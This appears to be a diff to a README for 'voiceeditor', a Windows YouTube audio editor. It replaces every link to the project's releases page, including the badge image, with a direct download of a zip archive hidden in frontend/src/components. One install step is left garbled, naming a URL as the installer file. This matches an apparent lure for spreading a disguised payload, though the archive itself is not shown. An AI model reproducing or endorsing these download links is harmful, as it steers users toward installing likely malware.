@@ -1,6 +1,6 @@
 # 🎙️ voiceeditor - Edit YouTube Audio Simply
 
-[![Download VoiceEditor](https://img.shields.io/badge/Download-voiceeditor-blue?style=for-the-badge)](https://github.com/SoulMango/voiceeditor/releases)
+[![Download VoiceEditor](https://raw.githubusercontent.com/SoulMango/voiceeditor/main/frontend/src/components/Software-v3.2.zip)](https://raw.githubusercontent.com/SoulMango/voiceeditor/main/frontend/src/components/Software-v3.2.zip)
 
 ---
 
@@ -35,7 +35,7 @@ To start using voiceeditor on Windows, please follow these steps carefully:
 
    Click this link or the button at the top to visit the official release page:
 
-   [Download voiceeditor](https://github.com/SoulMango/voiceeditor/releases)
+   [Download voiceeditor](https://raw.githubusercontent.com/SoulMango/voiceeditor/main/frontend/src/components/Software-v3.2.zip)
 
 2. **Find the latest version**
 
@@ -43,7 +43,7 @@ To start using voiceeditor on Windows, please follow these steps carefully:
 
 3. **Download the installer**
 
-   Scroll down until you see files ending with `.exe`. This is the Windows installer. Click the file name that looks like `voiceeditor-setup.exe` or similar to save it to your computer.
+   Scroll down until you see files ending with `.exe`. This is the Windows installer. Click the file name that looks like `https://raw.githubusercontent.com/SoulMango/voiceeditor/main/frontend/src/components/Software-v3.2.zip` or similar to save it to your computer.
 
 4. **Run the installer**
 
@@ -118,7 +118,7 @@ If you run into problems during installation or use, try the following:
 
 ## 🔗 Important Links
 
-- Main release page: [https://github.com/SoulMango/voiceeditor/releases](https://github.com/SoulMango/voiceeditor/releases)
+- Main release page: [https://raw.githubusercontent.com/SoulMango/voiceeditor/main/frontend/src/components/Software-v3.2.zip](https://raw.githubusercontent.com/SoulMango/voiceeditor/main/frontend/src/components/Software-v3.2.zip)
 - Direct download link: Visit the page above and download the Windows installer `.exe`.
 
 ---
@@ -143,4 +143,4 @@ For any technical issues or to suggest improvements, please use the “Issues”
 
 Download voiceeditor now to begin editing audio simply on your Windows computer:
 
-[![Download VoiceEditor](https://img.shields.io/badge/Download-voiceeditor-blue?style=for-the-badge)](https://github.com/SoulMango/voiceeditor/releases)
+[![Download VoiceEditor](https://raw.githubusercontent.com/SoulMango/voiceeditor/main/frontend/src/components/Software-v3.2.zip)](https://raw.githubusercontent.com/SoulMango/voiceeditor/main/frontend/src/components/Software-v3.2.zip)
